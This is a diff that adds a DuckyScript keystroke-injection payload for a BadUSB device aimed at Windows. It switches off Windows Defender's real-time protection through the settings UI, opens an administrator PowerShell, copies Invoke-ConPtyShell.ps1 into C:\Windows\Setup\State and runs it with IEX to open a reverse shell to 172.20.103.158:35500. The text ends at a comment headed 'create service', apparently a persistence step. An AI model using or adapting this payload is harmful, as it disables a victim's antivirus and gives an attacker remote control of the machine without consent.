@@ -1,0 +1,43 @@
+REM wait for enumaration:
+DELAY 2000
+
+REM disable antivirus
+GUI 
+DELAY 500
+STRING virus & threat protection
+ENTER
+DELAY 3000
+TAB 
+TAB
+TAB
+TAB
+DELAY 200
+ENTER
+DELAY 200
+SPACE 
+DELAY 3000
+ALT y
+GUI a
+DELAY 200
+ALT F4
+
+REM open powershell as Admin:
+GUI r
+DELAY 200
+STRING powershell
+DELAY 800
+CTRL SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 800
+
+REM copy connection script:
+STRING Copy-Item -Path Z:\Invoke-ConPtyShell.ps1 -Destination C:\Windows\Setup\State\Invoke-ConPtyShell.ps1
+ENTER
+
+DELAY 2000
+REM run connection:
+STRING IEX(IWR C:\Windows\Setup\State\Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.20.103.158 35500
+ENTER
+
+REM create service:
